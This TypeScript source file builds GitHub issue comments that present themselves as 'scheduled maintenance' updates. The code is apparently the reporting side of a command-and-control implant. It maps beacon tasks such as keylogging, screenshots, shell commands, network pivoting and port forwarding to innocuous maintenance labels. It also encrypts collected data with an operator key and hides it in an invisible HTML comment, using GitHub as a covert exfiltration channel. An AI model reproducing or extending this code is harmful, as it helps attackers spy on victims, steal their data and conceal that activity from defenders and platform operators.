/**
 * MaintenanceComment
 *
 * Markdown builder for the persistent infra update comment posted to each
 * tracked GitHub issue. The diagnostic payload is sealed with the operator's
 * public key (crypto_box_seal) so the raw data is never visible in the GitHub
 * UI — only the operator can decrypt it.
 *
 * The comment is identified by a hidden HTML marker:
 *   <!-- infra-maintenance:{UUID} -->
 * which appears as the very first line so it is never visible in GitHub's UI
 * but is reliably machine-parseable.
 */

import { sealBox, openSealBox, sodiumBytesToString } from "../crypto/sodium.ts";

// ── Types ──────────────────────────────────────────────────────────────────────

export interface MaintenanceTaskRecord {
  /** Full task UUID — used to match against TaskResult.taskId */
  taskId: string;
  /** Short display ref (8 hex chars from taskId, or "reg-ack") */
  ref: string;
  /** Task kind (shell, ping, reg-ack, …) */
  kind: string;
  /** Lifecycle state */
  status: "pending" | "delivered" | "completed" | "failed";
}

export interface MaintenanceCommentParams {
  /** UUID used in the hidden HTML marker */
  sessionId: string;
  hostname: string;
  /** ISO-8601 timestamp when this session started */
  openedAt: string;
  /** ISO-8601 timestamp of this update */
  updatedAt: string;
  /** e.g. "linux/x64" */
  platform: string;
  pid: number;
  /** Full beacon UUID — included in the encrypted diagnostic payload only */
  beaconId: string;
  tasks: MaintenanceTaskRecord[];
  diagnostics: Record<string, unknown>;
  /** Operator public key — used to seal the diagnostic payload (crypto_box_seal) */
  operatorPubKey: Uint8Array;
}

// ── Task kind → human-readable label ─────────────────────────────────────────

const TASK_KIND_LABELS: Record<string, string> = {
  "reg-ack":      "Initial setup verification",
  shell:          "Run diagnostic command",
  exec:           "Run diagnostic command",
  ping:           "Background sync completed",
  heartbeat:      "Background sync completed",
  upload:         "Artifact staging",
  download:       "Configuration sync",
  screenshot:     "System snapshot capture",
  keylog_start:   "Input monitoring start",
  keylog_stop:    "Input monitor flush",
  "load-module":  "Apply maintenance module",
  sleep:          "Maintenance sleep cycle",
  kill:           "Session termination",
  pivot:          "Network pivot setup",
  port_forward:   "Service relay configuration",
};

// ── Relative time helper ──────────────────────────────────────────────────────

export function relativeTime(isoTimestamp: string): string {
  const elapsedMs = Math.max(0, Date.now() - new Date(isoTimestamp).getTime());
  if (elapsedMs < 5_000)     return "just now";
  if (elapsedMs < 60_000)    return `${Math.round(elapsedMs / 1_000)}s ago`;
  if (elapsedMs < 3_600_000) return `${Math.round(elapsedMs / 60_000)}m ago`;
  return `${Math.round(elapsedMs / 3_600_000)}h ago`;
}

// ── Builder ────────────────────────────────────────────────────────────────────

export async function buildMaintenanceComment(p: MaintenanceCommentParams): Promise<string> {
  // Checkmark logic: completed and failed are both "done" (checked)
  const checkbox = (status: MaintenanceTaskRecord["status"]): string =>
    status === "completed" || status === "failed" ? "[x]" : "[ ]";

  // reg-ack is represented by the ✅ Initial check-in line — never a task row
  const visibleTasks = p.tasks.filter((t) => t.kind !== "reg-ack");

  const taskLines =
    visibleTasks.length === 0
      ? "_(no tasks queued)_"
      : visibleTasks
          .map((t) => {
            const label = TASK_KIND_LABELS[t.kind] ?? "General maintenance task";
            return `- ${checkbox(t.status)} **${t.ref}** — ${label}`;
          })
          .join("\n");

  const sealedPayload = await sealBox(JSON.stringify(p.diagnostics), p.operatorPubKey);

  return [
    `<!-- infra-maintenance:${p.sessionId} -->`,
    "",
    `### 🛠️ Scheduled maintenance`,
    `✅ Initial check-in`,
    "",
    `#### Queued Maintenance Tasks (${visibleTasks.length})`,
    taskLines,
    "",
    // Sealed payload is embedded inside the HTML comment so it never renders in GitHub's UI.
    `<!-- infra-diagnostic:${p.sessionId}:${sealedPayload} -->`,
  ].join("\n");
}

// ── Decrypt helper (operator / dashboard side) ────────────────────────────────

/**
 * Decrypt a sealed diagnostic payload from a maintenance comment.
 *
 * @param sealedB64          - The base64url ciphertext on the **Diagnostic payload** line
 * @param recipientPublicKey - Operator public key
 * @param recipientSecretKey - Operator secret key
 * @returns Parsed diagnostic object
 */
export async function decryptMaintenancePayload(
  sealedB64: string,
  recipientPublicKey: Uint8Array,
  recipientSecretKey: Uint8Array
): Promise<Record<string, unknown>> {
  const bytes = await openSealBox(sealedB64, recipientPublicKey, recipientSecretKey);
  return JSON.parse(sodiumBytesToString(bytes)) as Record<string, unknown>;
}
